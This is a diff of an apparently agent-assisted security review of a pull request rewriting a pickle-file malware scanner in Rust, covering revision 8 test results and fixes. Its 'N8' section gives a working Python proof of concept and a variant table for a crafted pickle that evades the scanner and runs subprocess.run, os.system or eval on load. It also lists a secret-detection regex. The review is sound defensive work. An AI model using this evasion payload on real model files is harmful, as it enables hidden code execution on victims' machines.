@@ -1,12 +1,14 @@
 # PR #990 Comprehensive Review — `feat: replace picklescan with Rust-native engine`
 
 **Branch:** `mdangelo/codex/rust-picklescan-rewrite`
-**Latest audited:** `9124f929` (rev 7: 4 commits on top of rev 6's `4a0d3113`)
+**Latest audited:** `77af4fae` (rev 8: 7 commits on top of rev 7's `9124f929`)
 **Scope:** Rust rewrite of pickle scanner, Python engine removed.
 
-This review combines five specialized agents (Rust core, Python integration, test coverage, CI/packaging, simplification), three Momus/Oracle critical re-reviews, and hands-on QA on 31 synthetic fixtures + 21 committed exploits. At rev 7, **validation gates fully green**: `pytest` **403 passed**, `cargo test` **62 passed**, `ruff`/`mypy`/`clippy` clean.
+This review combines five specialized agents (Rust core, Python integration, test coverage, CI/packaging, simplification), three Momus/Oracle critical re-reviews, and hands-on QA on 31 synthetic fixtures + 21 committed exploits. At rev 8, **validation gates fully green**: `pytest` **453 passed** (was 403 at rev 7), `cargo test` **72 passed** (was 62 at rev 7), `ruff`/`mypy`/`clippy` clean. Rust crate split into modular files: `expansion.rs`, `nested_surface.rs`, `post_budget.rs`, `stack.rs`, `strings_policy.rs`.
 
 On the repo's own 21 exploit fixtures and 2 safe samples the scanner is **0 FN / 0 FP** across every revision.
+
+> **Rev 8 release-readiness verdict: STILL NOT READY.** Rev 7 N7-CRITICAL-PRE-MEMO-BYPASS is **FIXED** for the same-source case (both operands from memo) — `record_post_budget_memo_stack_global_pattern` (`post_budget.rs:150`) resolves BINGET/LONG_BINGET/GET against `self.memo`. **And N6-SKIP-PARTIAL is FIXED** — `_has_alnum_secret_shape` now requires keyword seeds + structural shape; `_has_domain_or_ip_shape` requires `://` or path or proper IPv4. 1.8 MB realistic PyTorch state dict went from 0.97s (rev 7) → **0.20s** (rev 8) with `pickle_expensive_raw_detectors_skipped=True`. **But a new P0 surfaced**: **N8-CRITICAL-MIXED-MEMO-INLINE-BYPASS**. The post-budget scanner has separate scanners for "all inline" and "all memo" but no scanner for the **mixed** case where one operand comes from memo and the other from an inline string opcode. End-to-end validated: 10/10 mixed-pattern attacks bypass; `pickle.loads(mal)` actually executes `subprocess.run(['id'])` and prints `uid=501(mdangelo)...` to stdout; scanner reports `verdict=unknown, findings=0`.
 
 > **Original rev 7 release-readiness verdict: STILL NOT READY.** Rev 6's N6-CRITICAL-RCE-BYPASS-V2 is **FIXED** for all 5 string-push opcode variants (SHORT_BINUNICODE / BINUNICODE / BINUNICODE8 / SHORT_BINSTRING / BINSTRING) and all 11 tested dangerous globals now correctly detected. The default `pickle.dumps(evil_obj)` payload past the 1M opcode budget is CRITICAL `POST_BUDGET_GLOBAL`. OBJ / NEWOBJ_EX post-budget are also detected via the reduce-class-byte proximity check. **But a new P0 surfaced**: **N7-CRITICAL-PRE-MEMO-BYPASS**. An attacker who memoizes dangerous module/name strings BEFORE the 1M opcode budget exhausts and then uses `BINGET`/`LONG_BINGET`/`GET` to retrieve them past budget followed by `STACK_GLOBAL + REDUCE` completely bypasses the post-budget tail scan. End-to-end validated: `pickle.loads(mal)` actually executes `subprocess.run(['id'])` and prints `uid=501(mdangelo)...` to stdout; scanner reports `verdict=unknown, findings=0, criticals=0, warnings=0`.
 >
@@ -94,6 +96,117 @@ On the repo's own 21 exploit fixtures and 2 safe samples the scanner is **0 FN /
 | `S211` stderr noise                      | warning per process            | **gone** (S211 registered) |
 | Mid-string proto-0 encoded nested        | not probed                     | **detected (S601)**        |
 | `{"outer": b"JUNK" + nested}` small-blob | not probed                     | **detected (S213)**        |
+
+---
+
+## Rev 8 — new findings
+
+After re-pulling at `77af4fae`, the test suite is fully green (453 pytest + 72 cargo test). The Rust crate has been split into modular files: `expansion.rs`, `nested_surface.rs`, `post_budget.rs`, `stack.rs`, `strings_policy.rs`. **Two rev 7 P0/P1 issues are FIXED, one new P0 surfaces.**
+
+### **N8-CRITICAL-MIXED-MEMO-INLINE-BYPASS** (validated end-to-end, 10 variants)
+
+The rev 8 commit `30b7af9d fix: close picklescan rev7 review findings` adds `record_post_budget_memo_stack_global_pattern` (`packages/modelaudit-picklescan/rust/src/post_budget.rs:150`) which scans `BINGET/LONG_BINGET/GET <module_index> + BINGET/LONG_BINGET/GET <name_index> + STACK_GLOBAL` and resolves the indices through `self.memo` populated during the in-budget walk. This closes the rev 7 same-source-type pre-memo bypass.
+
+**But the scanner still has SEPARATE walks for "all inline" and "all memo" with no walk for the MIXED case** where one operand comes from memo and the other from an inline string opcode. Looking at `post_budget.rs:32-68`:
+
+```rust
+pub(crate) fn post_budget_global_matches(...) -> Vec<PostBudgetGlobalMatch> {
+    ...
+    while index < tail.len() {
+        if matches!(tail[index], b'c' | b'i') { record_post_budget_module_name_pair(...); }
+        record_post_budget_stack_global_pattern(tail, index, ...);          // all-inline
+        record_post_budget_memo_stack_global_pattern(tail, index, &resolve_memo_string, ...);  // all-memo
+        record_post_budget_extension_ref(tail, index, ...);
+        index += 1;
+    }
+    ...
+}
+```
+
+`record_post_budget_stack_global_pattern` calls `read_post_budget_text_operand` twice and expects both operands to be inline strings. `record_post_budget_memo_stack_global_pattern` calls `read_post_budget_memo_read` twice and expects both to be GET opcodes. Neither handles the mixed case.
+
+**Validated reproduction (executed `pickle.loads` in sandbox, confirmed `id` ran and printed `uid=501(mdangelo)...`):**
+
+```python
+import pickle, subprocess
+header = b'\x80\x04'
+filler = b'\x880' * 4_500_000  # 4.5M NEWTRUE+POP, exhausts 1M budget
+
+def sbu(s):
+    b = s.encode()
+    return bytes([0x8c, len(b)]) + b
+
+# Pattern: BINGET 0 (load 'subprocess' from memo) + inline SHORT_BINUNICODE 'run' + STACK_GLOBAL
+pre_memo = sbu('subprocess') + b'\x94'  # subprocess in memo slot 0
+tail = b'h\x00' + sbu('run') + b'\x93' + sbu('id') + b'\x85R.'
+mal = header + pre_memo + filler + tail
+
+from modelaudit_picklescan import scan_bytes
+r = scan_bytes(mal)
+assert r.verdict.value == 'unknown'   # NOT MALICIOUS
+assert len(r.findings) == 0           # ZERO findings
+
+pickle.loads(mal)
+# → subprocess.run(['id']) actually executes; uid output printed
+```
+
+**Full bypass matrix (10 variants validated):**
+
+| Module operand | Name operand | Verdict |
+|---|---|---|
+| memo (BINGET 0) | inline SHORT_BINUNICODE | ❌ bypass |
+| inline SHORT_BINUNICODE | memo (BINGET 0) | ❌ bypass |
+| memo | inline SHORT_BINSTRING (`U`) | ❌ bypass |
+| memo | inline STRING text (`V<chars>\n`) | ❌ bypass |
+| memo + DUP/POP padding | memo | ❌ bypass |
+| memo (`subprocess`) | inline `run` | ❌ bypass (subprocess.run) |
+| memo (`os`) | inline `system` | ❌ bypass (os.system) |
+| memo (`builtins`) | inline `eval` | ❌ bypass (builtins.eval) |
+| memo (`importlib`) | inline `reload` | ❌ bypass (importlib.reload) |
+| memo (`marshal`) | inline `loads` | ❌ bypass (marshal.loads) |
+
+All 10 dangerous globals × pattern combinations bypass. By contrast the same-source patterns (all-inline OR all-memo) are correctly detected.
+
+**Required fix:** In `post_budget.rs`, add a third walk that handles a mixed sequence:
+1. Read first operand: try `read_post_budget_text_operand` first, then fall back to `read_post_budget_memo_read` + `resolve_memo_string`.
+2. Read second operand: same.
+3. Skip MEMOIZE bytes between operands.
+4. Check for `\x93` STACK_GLOBAL byte.
+5. Apply `global_severity()` and reduce-class-byte proximity check.
+
+Or, simpler: rewrite `record_post_budget_stack_global_pattern` to accept a generic operand reader that tries text first then memo lookup. The two existing scanners (all-inline / all-memo) become special cases of this combined walker.
+
+**Attacker effort to exploit: trivial.** Anyone who can craft the rev 7 pre-memo bypass can craft this one — just don't bother memoizing both strings.
+
+**This is a P0 RCE-bypass merge blocker. Rev 8 is NOT merge ready.**
+
+### Rev 7 items FIXED in rev 8 (verified)
+
+- **N7-CRITICAL-PRE-MEMO-BYPASS** (same-source case): FIXED. All 5 GET opcode variants × 2 control-flow variants × 5 dangerous globals × 2 pattern shapes — every same-source-type pre-memo + GET past budget is now detected as `verdict=malicious` with CRITICAL `POST_BUDGET_GLOBAL`. Rust unit tests cover BINGET/LONG_BINGET/GET text + REDUCE/OBJ/NEWOBJ/NEWOBJ_EX proximity.
+- **N6-SKIP-PARTIAL** (hot-path skip defeated for secrets/network on real ML pickles): FIXED. The author tightened `_has_alnum_secret_shape` to require both a keyword from `_SECRET_SHAPE_KEYWORDS` (`pickle_scanner.py:225`) AND structural shape regex `_SECRET_ASSIGNMENT_SHAPE_RE` (`api[_-]?key|secret|token|password|passwd|pwd|credential|access[_-]?key` followed by `=`/`:` and 8+ alnum chars). `_has_domain_or_ip_shape` now requires `://` or path or proper IPv4 pattern. Verified: 1.8 MB realistic PyTorch state dict went from **0.97s** (rev 7) → **0.20s** (rev 8) with `pickle_expensive_raw_detectors_skipped=True`. Realistic perf claim now generalizes.
+
+### Other rev 8 commits (verified)
+
+- `caa34fb3 fix: harden nested pickle false-negative coverage` — additional nested pickle regression coverage.
+- `15585f85 fix: tighten joblib trusted tail handling` — narrows the joblib parse-failure suppression heuristic.
+- `133d9e4f fix: reduce pickle scanner false positives` — FP reduction across raw-text indicators.
+- `9b54dbed refactor: split rust picklescan engine modules` — large Rust crate split into 5 new files (expansion, nested_surface, post_budget, stack, strings_policy). Maintainability win.
+- `a600ef35 fix: detect protocol0 post-budget stack globals` — completes proto-0 STACK_GLOBAL coverage in the post-budget tail walker.
+- `77af4fae fix: allow python 3.13 pathlib pickle aliases` — Python 3.13 pickle compat.
+
+### Rev 8 release-readiness
+
+| Status | Severity | Item |
+|---|---|---|
+| ❌ | **P0 RCE BYPASS** | **N8-CRITICAL-MIXED-MEMO-INLINE-BYPASS** — mixed memo+inline patterns; 10/10 variants validated end-to-end |
+| ✅ | — | N7-CRITICAL-PRE-MEMO-BYPASS (same-source case) closed |
+| ✅ | — | N6-SKIP-PARTIAL closed (1.8 MB realistic PyTorch state dict: 0.97s → 0.20s) |
+| ✅ | — | Rust crate modularized (5 new source files, no behavior regression) |
+| ✅ | — | Protocol 0 post-budget STACK_GLOBAL coverage |
+| ✅ | — | Python 3.13 pickle alias compat |
+| ✅ | — | All test gates green: 453 pytest + 72 cargo test, ruff/mypy/clippy clean |
+
+**Verdict: STILL NOT MERGE READY.** Rev 8 fixed both rev 7 P0 items (pre-memo bypass and hot-path skip) but introduced no protection for mixed memo+inline operand patterns. The fix is straightforward: refactor `post_budget.rs` to use a single combined operand-reader that tries text first, then memo lookup. The scanner already has all the data — `read_post_budget_text_operand` and `read_post_budget_memo_read` already exist; they just need to be composed into one mixed walk instead of two separate walks.
 
 ---
 
